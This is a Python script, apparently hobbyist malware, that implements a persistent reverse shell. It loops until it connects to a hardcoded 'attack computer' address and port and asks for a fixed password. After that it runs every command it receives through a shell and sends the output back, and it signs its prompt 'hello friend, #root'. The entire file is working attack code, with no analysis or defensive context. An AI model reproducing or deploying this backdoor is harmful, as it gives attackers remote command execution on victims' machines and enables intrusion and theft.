#! /usr/bin/python
import time
from time import sleep
import subprocess #process commands
import socket #Process Socket data
from socket import error as SocketError
import errno



Password=b"tsociety"
host = "10.128.0.6" #attack computer IP address
port = 7901 #Attack Port

login_name=""
password=""



#def displayName():
#	print " Welcome to the Terminal of Holes"
#	print " "

#check password




def Login():
        global s
        s.sendall(b"Login: ")
        try:
            pwd=s.recv(1024)
            if pwd.strip() != Password:
                Login()
            else:
                s.sendall(b" hello friend,  #root >  ")
                Shell()
        except SocketError as e:
            if e.errno != errno.ECONNRESET:
                time.sleep(3600)

       # if pwd.strip() != Password:
        #        Login()
       # else:
        #        s.sendall(b" hello friend,  #root >  ")
         #       Shell()
#execute commands
def Shell():
    while True :
        data=s.recv(1024)
        if data.strip() == b":kill" :
            
            s.close()
            #s.connect_ex((host,port))
            break
            #s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            #s.open(s)
        proc =subprocess.Popen(data,shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        s.sendall(output)
        
        s.sendall(b" hello friend, #root > ")


#s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#asyncio.timeout(timeout, *, loop=None)
#.timeout(timeout, *, loop=None)
#s.settimeout(100)
#s.connect_ex((host,port))
#Login()
#s.connect_ex((host,port))
#serversocket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#serversocket.bind((socket.gethostname(),port))
#s.listen(5)

while True:
    print("again")
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    while s.connect_ex((host,port)) != 0:
        
        sleep(10)
    Login()
    #print ("printed after killed")
    #except(RuntimeError,TimeoutError,ConnectionAbortedError):
       # s.connect((host,port))
       # Login()


#if(s.connect((host,port))==2):
 #   Login()	



#login_name = raw_input("Please enter your login name: ")
#return login_name

#def getPassword():
	# password= raw_input("Please enter your password: ")
	 #return password

#def Authenticate(login_name, password):#
	#count= 0
#
##if login_name== Login :
#		if password== Password :
				
#				print "Welcome to the Server! Hack as you may"
#	
#	elif login_name==Login :
#		if password!= Password : 
#			print "Incorrect password."	
#			return 0
#displayName()
#Authenticate(getLogin(),getPassword())W
